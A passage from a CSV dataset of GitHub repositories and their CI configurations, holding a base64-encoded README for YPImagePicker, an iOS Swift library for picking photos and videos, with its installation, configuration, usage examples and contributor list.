name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
aG90byAgCvCfjqUgVmlkZW8gIArinILvuI8gQ3JvcCAgCuKaoe+4jyBGbGFz
aCAgCvCflrwgRmlsdGVycyAgCvCfk4EgQWxidW1zICAK8J+UoiBNdWx0aXBs
ZSBTZWxlY3Rpb24gIArwn5OPIFZpZGVvIFRyaW1taW5nICYgQ292ZXIgc2Vs
ZWN0aW9uICAK8J+TkCBPdXRwdXQgaW1hZ2Ugc2l6ZSAgCkFuZCBtYW55IG1v
cmUuLi4KCiMjIEluc3RhbGxhdGlvbgoKRHJvcCBpbiB0aGUgQ2xhc3NlcyBm
b2xkZXIgdG8geW91ciBYY29kZSBwcm9qZWN0LiAgCllvdSBjYW4gYWxzbyB1
c2UgQ29jb2FQb2RzIG9yIENhcnRoYWdlLgoKIyMjIyBVc2luZyBbQ29jb2FQ
b2RzXShodHRwOi8vY29jb2Fwb2RzLm9yZy8pCgpGaXJzdCBiZSBzdXJlIHRv
IHJ1biBgcG9kIHJlcG8gdXBkYXRlYCB0byBnZXQgdGhlIGxhdGVzdCB2ZXJz
aW9uIGF2YWlsYWJsZS4KCkFkZCBgcG9kICdZUEltYWdlUGlja2VyJ2AgdG8g
eW91ciBgUG9kZmlsZWAgYW5kIHJ1biBgcG9kIGluc3RhbGxgLiBBbHNvIGFk
ZCBgdXNlX2ZyYW1ld29ya3MhYCB0byB0aGUgYFBvZGZpbGVgLgoKYGBgCnRh
cmdldCAnTXlBcHAnCnBvZCAnWVBJbWFnZVBpY2tlcicKdXNlX2ZyYW1ld29y
a3MhCmBgYAoKIyMjIyBVc2luZyBbQ2FydGhhZ2VdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9DYXJ0aGFnZS9DYXJ0aGFnZSkKCkFkZCBgZ2l0aHViICJZdW1teXBl
dHMvWVBJbWFnZVBpY2tlciJgIHRvIHlvdXIgYENhcnRmaWxlYCBhbmQgcnVu
IGBjYXJ0aGFnZSB1cGRhdGVgLiBJZiB1bmZhbWlsaWFyIHdpdGggQ2FydGhh
Z2UgdGhlbiBjaGVja291dCB0aGVpciBbR2V0dGluZyBTdGFydGVkIHNlY3Rp
b25dKGh0dHBzOi8vZ2l0aHViLmNvbS9DYXJ0aGFnZS9DYXJ0aGFnZSNnZXR0
aW5nLXN0YXJ0ZWQpLgoKYGBgCmdpdGh1YiAiWXVtbXlwZXRzL1lQSW1hZ2VQ
aWNrZXIiCmBgYAoKIyMgUGxpc3QgZW50cmllcwoKSW4gb3JkZXIgZm9yIHlv
dXIgYXBwIHRvIGFjY2VzcyBjYW1lcmEgYW5kIHBob3RvIGxpYnJhcmllcywK
eW91J2xsIG5lZWQgdG8gYWQgdGhlc2UgYHBsaXN0IGVudHJpZXNgIDoKCi0g
UHJpdmFjeSAtIENhbWVyYSBVc2FnZSBEZXNjcmlwdGlvbiAocGhvdG8vdmlk
ZW9zKQotIFByaXZhY3kgLSBQaG90byBMaWJyYXJ5IFVzYWdlIERlc2NyaXB0
aW9uIChsaWJyYXJ5KQotIFByaXZhY3kgLSBNaWNyb3Bob25lIFVzYWdlIERl
c2NyaXB0aW9uICh2aWRlb3MpCgpgYGB4bWwKPGtleT5OU0NhbWVyYVVzYWdl
RGVzY3JpcHRpb248L2tleT4KPHN0cmluZz55b3VyV29yZGluZzwvc3RyaW5n
Pgo8a2V5Pk5TUGhvdG9MaWJyYXJ5VXNhZ2VEZXNjcmlwdGlvbjwva2V5Pgo8
c3RyaW5nPnlvdXJXb3JkaW5nPC9zdHJpbmc+CjxrZXk+TlNNaWNyb3Bob25l
VXNhZ2VEZXNjcmlwdGlvbjwva2V5Pgo8c3RyaW5nPnlvdXJXb3JkaW5nPC9z
dHJpbmc+CmBgYAoKIyMgQ29uZmlndXJhdGlvbgoKQWxsIHRoZSBjb25maWd1
cmF0aW9uIGVuZHBvaW50cyBhcmUgaW4gdGhlIFtZUEltYWdlUGlja2VyQ29u
ZmlndXJhdGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL1l1bW15cGV0cy9ZUElt
YWdlUGlja2VyL2Jsb2IvbWFzdGVyL1NvdXJjZS9Db25maWd1cmF0aW9uL1lQ
SW1hZ2VQaWNrZXJDb25maWd1cmF0aW9uLnN3aWZ0KSBzdHJ1Y3QuCkJlbG93
IGFyZSB0aGUgZGVmYXVsdCB2YWx1ZSBmb3IgcmVmZXJlbmNlLCBmZWVsIGZy
ZWUgdG8gcGxheSBhcm91bmQgOikKCmBgYHN3aWZ0CnZhciBjb25maWcgPSBZ
UEltYWdlUGlja2VyQ29uZmlndXJhdGlvbigpCi8vIFtFZGl0IGNvbmZpZ3Vy
YXRpb24gaGVyZSAuLi5dCi8vIEJ1aWxkIGEgcGlja2VyIHdpdGggeW91ciBj
b25maWd1cmF0aW9uCmxldCBwaWNrZXIgPSBZUEltYWdlUGlja2VyKGNvbmZp
Z3VyYXRpb246IGNvbmZpZykKYGBgCgojIyMgR2VuZXJhbApgYGBTd2lmdApj
b25maWcuaXNTY3JvbGxUb0NoYW5nZU1vZGVzRW5hYmxlZCA9IHRydWUKY29u
ZmlnLm9ubHlTcXVhcmVJbWFnZXNGcm9tQ2FtZXJhID0gdHJ1ZQpjb25maWcu
dXNlc0Zyb250Q2FtZXJhID0gZmFsc2UKY29uZmlnLnNob3dzUGhvdG9GaWx0
ZXJzID0gdHJ1ZQpjb25maWcuc2hvdWxkU2F2ZU5ld1BpY3R1cmVzVG9BbGJ1
bSA9IHRydWUKY29uZmlnLmFsYnVtTmFtZSA9ICJEZWZhdWx0WVBJbWFnZVBp
Y2tlckFsYnVtTmFtZSIKY29uZmlnLnN0YXJ0T25TY3JlZW4gPSBZUFBpY2tl
clNjcmVlbi5waG90bwpjb25maWcuc2NyZWVucyA9IFsubGlicmFyeSwgLnBo
b3RvXQpjb25maWcuc2hvd3NDcm9wID0gLm5vbmUKY29uZmlnLnRhcmdldElt
YWdlU2l6ZSA9IFlQSW1hZ2VTaXplLm9yaWdpbmFsCmNvbmZpZy5vdmVybGF5
VmlldyA9IFVJVmlldygpCmNvbmZpZy5oaWRlc1N0YXR1c0JhciA9IHRydWUK
Y29uZmlnLmhpZGVzQm90dG9tQmFyID0gZmFsc2UKY29uZmlnLnByZWZlcnJl
ZFN0YXR1c0JhclN0eWxlID0gVUlTdGF0dXNCYXJTdHlsZS5kZWZhdWx0CmNv
bmZpZy5ib3R0b21NZW51SXRlbVNlbGVjdGVkQ29sb3VyID0gVUlDb2xvcihy
OiAzOCwgZzogMzgsIGI6IDM4KQpjb25maWcuYm90dG9tTWVudUl0ZW1VblNl
bGVjdGVkQ29sb3VyID0gVUlDb2xvcihyOiAxNTMsIGc6IDE1MywgYjogMTUz
KQpjb25maWcuZmlsdGVycyA9IFtEZWZhdWx0WVBGaWx0ZXJzLi4uXQpgYGAK
CiMjIyBMaWJyYXJ5CmBgYHN3aWZ0CmNvbmZpZy5saWJyYXJ5Lm9wdGlvbnMg
PSBuaWwKY29uZmlnLmxpYnJhcnkub25seVNxdWFyZSA9IGZhbHNlCmNvbmZp
Zy5saWJyYXJ5Lm1pbldpZHRoRm9ySXRlbSA9IG5pbApjb25maWcubGlicmFy
eS5tZWRpYVR5cGUgPSBZUGxpYnJhcnlNZWRpYVR5cGUucGhvdG8KY29uZmln
LmxpYnJhcnkubWF4TnVtYmVyT2ZJdGVtcyA9IDEKY29uZmlnLmxpYnJhcnku
bWluTnVtYmVyT2ZJdGVtcyA9IDEKY29uZmlnLmxpYnJhcnkubnVtYmVyT2ZJ
dGVtc0luUm93ID0gNApjb25maWcubGlicmFyeS5zcGFjaW5nQmV0d2Vlbkl0
ZW1zID0gMS4wCmNvbmZpZy5saWJyYXJ5LnNraXBTZWxlY3Rpb25zR2FsbGVy
eSA9IGZhbHNlCmBgYAoKIyMjIFZpZGVvCmBgYHN3aWZ0CmNvbmZpZy52aWRl
by5jb21wcmVzc2lvbiA9IEFWQXNzZXRFeHBvcnRQcmVzZXRIaWdoZXN0UXVh
bGl0eQpjb25maWcudmlkZW8uZmlsZVR5cGUgPSAubW92CmNvbmZpZy52aWRl
by5yZWNvcmRpbmdUaW1lTGltaXQgPSA2MC4wCmNvbmZpZy52aWRlby5saWJy
YXJ5VGltZUxpbWl0ID0gNjAuMApjb25maWcudmlkZW8ubWluaW11bVRpbWVM
aW1pdCA9IDMuMApjb25maWcudmlkZW8udHJpbW1lck1heER1cmF0aW9uID0g
NjAuMApjb25maWcudmlkZW8udHJpbW1lck1pbkR1cmF0aW9uID0gMy4wCmBg
YAoKIyMgRGVmYXVsdCBDb25maWd1cmF0aW9uCgpgYGBzd2lmdAovLyBTZXQg
dGhlIGRlZmF1bHQgY29uZmlndXJhdGlvbiBmb3IgYWxsIHBpY2tlcnMKWVBJ
bWFnZVBpY2tlckNvbmZpZ3VyYXRpb24uc2hhcmVkID0gY29uZmlnCgovLyBB
bmQgdGhlbiB1c2UgdGhlIGRlZmF1bHQgY29uZmlndXJhdGlvbiBsaWtlIHNv
OgpsZXQgcGlja2VyID0gWVBJbWFnZVBpY2tlcigpCmBgYAoKIyMgVXNhZ2UK
CkZpcnN0IHRoaW5ncyBmaXJzdCBgaW1wb3J0IFlQSW1hZ2VQaWNrZXJgLiAg
CgpUaGUgcGlja2VyIG9ubHkgaGFzIG9uZSBjYWxsYmFjayBgZGlkRmluaXNo
UGlja2luZ2AgZW5hYmxpbmcgeW91IHRvIGhhbmRsZSBhbGwgdGhlIGNhc2Vz
LiBMZXQncyBzZWUgc29tZSB0eXBpY2FsIHVzZSBjYXNlcyDwn6STCgojIyMg
U2luZ2xlIFBob3RvCmBgYHN3aWZ0CmxldCBwaWNrZXIgPSBZUEltYWdlUGlj
a2VyKCkKcGlja2VyLmRpZEZpbmlzaFBpY2tpbmcgeyBbdW5vd25lZCBwaWNr
ZXJdIGl0ZW1zLCBfIGluCiAgICBpZiBsZXQgcGhvdG8gPSBpdGVtcy5zaW5n
bGVQaG90byB7CiAgICAgICAgcHJpbnQocGhvdG8uZnJvbUNhbWVyYSkgLy8g
SW1hZ2Ugc291cmNlIChjYW1lcmEgb3IgbGlicmFyeSkKICAgICAgICBwcmlu
dChwaG90by5pbWFnZSkgLy8gRmluYWwgaW1hZ2Ugc2VsZWN0ZWQgYnkgdGhl
IHVzZXIKICAgICAgICBwcmludChwaG90by5vcmlnaW5hbEltYWdlKSAvLyBv
cmlnaW5hbCBpbWFnZSBzZWxlY3RlZCBieSB0aGUgdXNlciwgdW5maWx0ZXJl
ZAogICAgICAgIHByaW50KHBob3RvLm1vZGlmaWVkSW1hZ2UpIC8vIFRyYW5z
Zm9ybWVkIGltYWdlLCBjYW4gYmUgbmlsCiAgICAgICAgcHJpbnQocGhvdG8u
ZXhpZk1ldGEpIC8vIFByaW50IGV4aWYgbWV0YSBkYXRhIG9mIG9yaWdpbmFs
IGltYWdlLgogICAgfQogICAgcGlja2VyLmRpc21pc3MoYW5pbWF0ZWQ6IHRy
dWUsIGNvbXBsZXRpb246IG5pbCkKfQpwcmVzZW50KHBpY2tlciwgYW5pbWF0
ZWQ6IHRydWUsIGNvbXBsZXRpb246IG5pbCkKYGBgCgojIyMgU2luZ2xlIHZp
ZGVvCmBgYHN3aWZ0Ci8vIEhlcmUgd2UgY29uZmlndXJlIHRoZSBwaWNrZXIg
dG8gb25seSBzaG93IHZpZGVvcywgbm8gcGhvdG9zLgp2YXIgY29uZmlnID0g
WVBJbWFnZVBpY2tlckNvbmZpZ3VyYXRpb24oKQpjb25maWcuc2NyZWVucyA9
IFsubGlicmFyeSwgLnZpZGVvXQpjb25maWcubGlicmFyeS5tZWRpYVR5cGUg
PSAudmlkZW8KCmxldCBwaWNrZXIgPSBZUEltYWdlUGlja2VyKGNvbmZpZ3Vy
YXRpb246IGNvbmZpZykKcGlja2VyLmRpZEZpbmlzaFBpY2tpbmcgeyBbdW5v
d25lZCBwaWNrZXJdIGl0ZW1zLCBfIGluCiAgICBpZiBsZXQgdmlkZW8gPSBp
dGVtcy5zaW5nbGVWaWRlbyB7CiAgICAgICAgcHJpbnQodmlkZW8uZnJvbUNh
bWVyYSkKICAgICAgICBwcmludCh2aWRlby50aHVtYm5haWwpCiAgICAgICAg
cHJpbnQodmlkZW8udXJsKQogICAgfQogICAgcGlja2VyLmRpc21pc3MoYW5p
bWF0ZWQ6IHRydWUsIGNvbXBsZXRpb246IG5pbCkKfQpwcmVzZW50KHBpY2tl
ciwgYW5pbWF0ZWQ6IHRydWUsIGNvbXBsZXRpb246IG5pbCkKYGBgCgpBcyB5
b3UgY2FuIHNlZSBgc2luZ2xlUGhvdG9gIGFuZCBgc2luZ2xlVmlkZW9gIGhl
bHBlcnMgYXJlIGhlcmUgdG8gaGVscCB5b3UgaGFuZGxlIHNpbmdsZSBtZWRp
YSB3aGljaCBhcmUgdmVyeSBjb21tb24sIHdoaWxlIHVzaW5nIHRoZSBzYW1l
IGNhbGxiYWNrIGZvciBhbGwgeW91ciB1c2UtY2FzZXMgXG8vCgojIyMgTXVs
dGlwbGUgc2VsZWN0aW9uClRvIGVuYWJsZSBtdWx0aXBsZSBzZWxlY3Rpb24g
bWFrZSBzdXJlIHRvIHNldCBgbGlicmFyeS5tYXhOdW1iZXJPZkl0ZW1zYCBp
biB0aGUgY29uZmlndXJhdGlvbiBsaWtlIHNvOgpgYGBzd2lmdAp2YXIgY29u
ZmlnID0gWVBJbWFnZVBpY2tlckNvbmZpZ3VyYXRpb24oKQpjb25maWcubGli
cmFyeS5tYXhOdW1iZXJPZkl0ZW1zID0gMwpsZXQgcGlja2VyID0gWVBJbWFn
ZVBpY2tlcihjb25maWd1cmF0aW9uOiBjb25maWcpCmBgYApUaGVuIHlvdSBj
YW4gaGFuZGxlIG11bHRpcGxlIHNlbGVjdGlvbiBpbiB0aGUgc2FtZSBjYWxs
YmFjayB5b3Uga25vdyBhbmQgbG92ZSA6CmBgYHN3aWZ0CnBpY2tlci5kaWRG
aW5pc2hQaWNraW5nIHsgW3Vub3duZWQgcGlja2VyXSBpdGVtcywgY2FuY2Vs
bGVkIGluCiAgICBmb3IgaXRlbSBpbiBpdGVtcyB7CiAgICAgICAgc3dpdGNo
IGl0ZW0gewogICAgICAgIGNhc2UgLnBob3RvKGxldCBwaG90byk6CiAgICAg
ICAgICAgIHByaW50KHBob3RvKQogICAgICAgIGNhc2UgLnZpZGVvKGxldCB2
aWRlbyk6CiAgICAgICAgICAgIHByaW50KHZpZGVvKQogICAgICAgIH0KICAg
IH0KICAgIHBpY2tlci5kaXNtaXNzKGFuaW1hdGVkOiB0cnVlLCBjb21wbGV0
aW9uOiBuaWwpCn0KYGBgCgojIyMgSGFuZGxlIENhbmNlbCBldmVudCAoaWYg
bmVlZGVkKQpgYGBzd2lmdApwaWNrZXIuZGlkRmluaXNoUGlja2luZyB7IFt1
bm93bmVkIHBpY2tlcl0gaXRlbXMsIGNhbmNlbGxlZCBpbgogICAgaWYgY2Fu
Y2VsbGVkIHsKICAgICAgICBwcmludCgiUGlja2VyIHdhcyBjYW5jZWxlZCIp
CiAgICB9CiAgICBwaWNrZXIuZGlzbWlzcyhhbmltYXRlZDogdHJ1ZSwgY29t
cGxldGlvbjogbmlsKQp9CmBgYApUaGF0J3MgaXQgIQoKIyMgTGFuZ3VhZ2Vz
CvCfh7rwn4e4IEVuZ2xpc2gsIPCfh6rwn4e4IFNwYW5pc2gsIPCfh6vwn4e3
IEZyZW5jaCDwn4e38J+HuiBSdXNzaWFuLCDwn4ez8J+HsSBEdXRjaCwg8J+H
p/Cfh7cgQnJhemlsaWFuLCDwn4e58J+HtyBUdXJraXNoLCDwn4e48J+HviBB
cmFiaWMsIPCfh6nwn4eqIEdlcm1hbiwg8J+HrvCfh7kgSXRhbGlhbiwg8J+H
r/Cfh7UgSmFwYW5lc2UsIPCfh6jwn4ezIENoaW5lc2UsIPCfh67wn4epIElu
ZG9uZXNpYW4sIPCfh7Dwn4e3IEtvcmVhbiwg8J+HufCfh7wgVHJhZGl0aW9u
YWwgQ2hpbmVzZe+8iFRhaXdhbikKCklmIHlvdXIgbGFuZ3VhZ2UgaXMgbm90
IHN1cHBvcnRlZCwgeW91IGNhbiBzdGlsbCBjdXN0b21pemUgdGhlIHdvcmRp
bmdzIHZpYSB0aGUgYGNvbmZpZ3VyYXRpb24ud29yZGluZ3NgIGFwaToKCmBg
YHN3aWZ0CmNvbmZpZy53b3JkaW5ncy5saWJyYXJ5VGl0bGUgPSAiR2FsbGVy
eSIKY29uZmlnLndvcmRpbmdzLmNhbWVyYVRpdGxlID0gIkNhbWVyYSIKY29u
ZmlnLndvcmRpbmdzLm5leHQgPSAiT0siCmBgYApCZXR0ZXIgeWV0IHlvdSBj
YW4gc3VibWl0IGFuIGlzc3VlIG9yIHB1bGwgcmVxdWVzdCB3aXRoIHlvdXIg
YExvY2FsaXphYmxlLnN0cmluZ3NgIGZpbGUgdG8gYWRkIGEgbmV3IGxhbmd1
YWdlICEKCiMjIFVJIEN1c3RvbWl6YXRpb24KV2UgdHJpZWQgdG8ga2VlcCB0
aGluZ3MgYXMgbmF0aXZlIGFzIHBvc3NpYmxlLCBzbyB0aGlzIGlzIGRvbmUg
bW9zdGx5IHRocm91Z2ggbmF0aXZlIEFwaXMuCgojIyMgTmF2aWdhdGlvbiBi
YXIgY29sb3IKYGBgc3dpZnQKbGV0IGNvbG9yZWRJbWFnZSA9IFVJSW1hZ2Uo
Y29sb3I6IC5yZWQpClVJTmF2aWdhdGlvbkJhci5hcHBlYXJhbmNlKCkuc2V0
QmFja2dyb3VuZEltYWdlKGNvbG9yZWRJbWFnZSwgZm9yOiBVSUJhck1ldHJp
Y3MuZGVmYXVsdCkKLy8gVUlJbWFnZStjb2xvciBoZWxwZXIgaHR0cHM6Ly9z
dGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjY1NDIwMzUvY3JlYXRlLXVp
aW1hZ2Utd2l0aC1zb2xpZC1jb2xvci1pbi1zd2lmdApgYGAKCiMjIyBOYXZp
Z2F0aW9uIGJhciBmb250cwpgYGBzd2lmdApsZXQgYXR0cmlidXRlcyA9IFtO
U0F0dHJpYnV0ZWRTdHJpbmdLZXkuZm9udCA6IFVJRm9udC5zeXN0ZW1Gb250
KG9mU2l6ZTogMzAsIHdlaWdodDogLmJvbGQpIF0KVUlOYXZpZ2F0aW9uQmFy
LmFwcGVhcmFuY2UoKS50aXRsZVRleHRBdHRyaWJ1dGVzID0gYXR0cmlidXRl
cyAvLyBUaXRsZSBmb250cwpVSUJhckJ1dHRvbkl0ZW0uYXBwZWFyYW5jZSgp
LnNldFRpdGxlVGV4dEF0dHJpYnV0ZXMoYXR0cmlidXRlcywgZm9yOiAubm9y
bWFsKSAvLyBCYXIgQnV0dG9uIGZvbnRzCmBgYAoKIyMjIE5hdmlnYXRpb24g
YmFyIFRleHQgY29sb3JzCmBgYHN3aWZ0ClVJTmF2aWdhdGlvbkJhci5hcHBl
YXJhbmNlKCkudGl0bGVUZXh0QXR0cmlidXRlcyA9IFtOU0F0dHJpYnV0ZWRT
dHJpbmdLZXkuZm9yZWdyb3VuZENvbG9yIDogVUlDb2xvci55ZWxsb3cgXSAv
LyBUaXRsZSBjb2xvcgpVSU5hdmlnYXRpb25CYXIuYXBwZWFyYW5jZSgpLnRp
bnRDb2xvciA9IC5yZWQgLy8gTGVmdC4gYmFyIGJ1dHRvbnMKY29uZmlnLmNv
bG9ycy50aW50Q29sb3IgPSAuZ3JlZW4gLy8gUmlnaHQgYmFyIGJ1dHRvbnMg
KGFjdGlvbnMpCmBgYAoKIyMgT3JpZ2luYWwgUHJvamVjdCAmIEF1dGhvcgoK
VGhpcyBwcm9qZWN0IGhhcyBiZWVuIGZpcnN0IGluc3BpcmVkIGJ5IFtGdXN1
bWFdKGh0dHBzOi8vZ2l0aHViLmNvbS95dGFremsvRnVzdW1hKQpDb25zaWRl
cmluZyB0aGUgYmlnIGNvZGUsIGRlc2lnbiBjaGFuZ2VzIGFuZCBhbGwgdGhl
IGFkZGl0aW9uYWwgZmVhdHVyZXMgYWRkZWQgYWxvbmcgdGhlIHdheSwgdGhp
cyBtb3ZlZCBmb3JtIGEgZm9yayB0byBhIHN0YW5kYWxvbmUgc2VwYXJhdGUg
cmVwbywgYWxzbyBmb3IgZGlzY292ZXJhYmlsaXR5IHB1cnBvc2VzLgpPcmln
aW5hbCBGdXN1bWEgYXV0aG9yIGlzIFt5dGFrel0oaHR0cDovL3l0YWt6ay5t
ZSkKCiMjIENvcmUgVGVhbQo8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20v
UzRjaGEiPgogIDxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29u
dGVudC5jb20vWXVtbXlwZXRzL1lQSW1hZ2VQaWNrZXIvbWFzdGVyL0ltYWdl
cy9jb3JlVGVhbTEucG5nIiB3aWR0aD0iNzBweCI+CjwvYT4KPGEgaHJlZj0i
aHR0cHM6Ly9naXRodWIuY29tL05pa0tvdklvcyI+CiAgPGltZyBzcmM9Imh0
dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ZdW1teXBldHMvWVBJ
bWFnZVBpY2tlci9tYXN0ZXIvSW1hZ2VzL2NvcmVUZWFtMi5wbmciIHdpZHRo
PSI3MHB4Ij4KPC9hPgoKIyMgQ29udHJpYnV0b3JzIPCfmY8KW2V6aXNhemlz
XShodHRwczovL2dpdGh1Yi5jb20vZXppc2F6aXMpLApbaGFuaWtlZGRhaF0o
aHR0cHM6Ly9naXRodWIuY29tL2hhbmlrZWRkYWgpLApbdGFoYWJ1cmFrXSho
dHRwczovL2dpdGh1Yi5jb20vdGFoYWJ1cmFrKSwKW2Fqa29sZWFuXShodHRw
czovL2dpdGh1Yi5jb20vYWprb2xlYW4pLApbQW5hcmNob3NjaG5pdHplbF0o
aHR0cHM6Ly9naXRodWIuY29tL0FuYXJjaG9zY2huaXR6ZWwpLApbRW1pbF0o
aHR0cHM6Ly9naXRodWIuY29tL2hlaXRhcmEpLApbUmFmYWVsIERhbWFzY2Vu
b10oaHR0cHM6Ly9naXRodWIuY29tL0RhbWFzY2Vub1JhZmFlbCksCltjZW5r
aW5ndW5sdWd1XShodHRwczovL2dpdGh1Yi5jb20vaHR0cHM6Ly9naXRodWIu
Y29tL2Nlbmtpbmd1bmx1Z3UpCltoZWl0YXJhXShodHRwczovL2dpdGh1Yi5j
b20vaGVpdGFyYSkKW3BvcnRlbGxhYV0oaHR0cHM6Ly9naXRodWIuY29tL3Bv
cnRlbGxhYSkKW1JvbWl4ZXJ5XShodHRwczovL2dpdGh1Yi5jb20vcm9taXhl
cnkpCltzaG90YXRdKGh0dHBzOi8vZ2l0aHViLmNvbS9zaG90YXQpCgpTcGVj
aWFsIHRoYW5rcyB0byBbaWh0aWh0XShodHRwczovL2dpdGh1Yi5jb20vaWh0
aWh0KSBmb3IgdGhlIGNvb2wgbG9va2luZyBsb2dvIQoKIyMgVGhleSBoZWxw
ZWQgdXMgb25lIHdheSBvciBhbm90aGVyIPCfkY8KW3VzZXJkYXJdKGh0dHBz
Oi8vZ2l0aHViLmNvbS91c2VyZGFyKSwKW0V2Z2VuaXldKGh0dHBzOi8vZ2l0
aHViLmNvbS9Fd2c3NzcpLApbTWVoZGlNYWhkbG9vXShodHRwczovL2dpdGh1
Yi5jb20vTWVoZGlNYWhkbG9vKSwKW29tLWhhXShodHRwczovL2dpdGh1Yi5j
b20vb20taGEpLApbdXNlcmRhcl0oaHR0cHM6Ly9naXRodWIuY29tL3VzZXJk
YXIpLApbQ2hpbnRhbldlYXBwXShodHRwczovL2dpdGh1Yi5jb20vQ2hpbnRh
bldlYXBwKSwKW2VkZGllZXNwaW5hbF0oaHR0cHM6Ly9naXRodWIuY29tL2Vk
ZGllZXNwaW5hbCksClt2aWt0b3JnYXJkYXJ0XShodHRwczovL2dpdGh1Yi5j
b20vdmlrdG9yZ2FyZGFydCksCltnZGVsYXJvc2FdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9nZGVsYXJvc2EpLApbY3dlc3RNb2JpbGVdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9jd2VzdE1vYmlsZSksCltUaW55aWtdKGh0dHBzOi8vZ2l0aHViLmNv
bS9UaW55aWspLApbVml2ZWt0aGFrdXI2NDddKGh0dHBzOi8vZ2l0aHViLmNv
bS9WaXZla3RoYWt1cjY0NyksClt0b21hc2J5a293c2tpXShodHRwczovL2dp
dGh1Yi5jb20vdG9tYXNieWtvd3NraSksClthcnRlbXNtaWtoXShodHRwczov
L2dpdGh1Yi5jb20vYXJ0ZW1zbWlraCksClt0aGVvbG9mXShodHRwczovL2dp
dGh1Yi5jb20vdGhlb2xvZiksCltkb25nZG9uZzMzNDRdKGh0dHBzOi8vZ2l0
aHViLmNvbS9kb25nZG9uZzMzNDQpLApbTUhYNzkyXShodHRwczovL2dpdGh1
Yi5jb20vTUhYNzkyKSwKW0NJcm9uZm91bmRlcnNvbl0oaHR0cHM6Ly9naXRo
dWIuY29tL0NJcm9uZm91bmRlcnNvbiksCltHdWVycml4XShodHRwczovL2dp
dGh1Yi5jb20vR3VlcnJpeCksCltaZWRkMDIwMl0oaHR0cHM6Ly9naXRodWIu
Y29tL1plZGQwMjAyKSwKW21vaGFtbWFkWjc0XShodHRwczovL2dpdGh1Yi5j
b20vbW9oYW1tYWRaNzQpLApbU2FsbWFuR2h1bXNhbmldKGh0dHBzOi8vZ2l0
aHViLmNvbS9TYWxtYW5HaHVtc2FuaSksClt3ZWd3ZWlzZXI2XShodHRwczov
L2dpdGh1Yi5jb20vd2Vnd2Vpc2VyNiksCltCaWxhbEFrcmFtXShodHRwczov
L2dpdGh1Yi5jb20vQmlsYWxBa3JhbSksCltLYXppbUFobWFkXShodHRwczov
L2dpdGh1Yi5jb20vS2F6aW1BaG1hZCksCltKdXN0aW5CZUJveV0oaHR0cHM6
Ly9naXRodWIuY29tL0p1c3RpbkJlQm95KSwKW1Nhc2hhTWV5ZXJdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9TYXNoYU1leWVyKSwKW0dTaHVzaGFuaWtdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9HU2h1c2hhbmlrKSwKW0Nlejk1XShodHRwczovL2dp
dGh1Yi5jb20vQ2V6OTUpLApbUGFsYW5kb10oaHR0cHM6Ly9naXRodWIuY29t
L1BhbGFuZG8pLApbc2ViYXN0aWVuYm91bG9nbmVdKGh0dHBzOi8vZ2l0aHVi
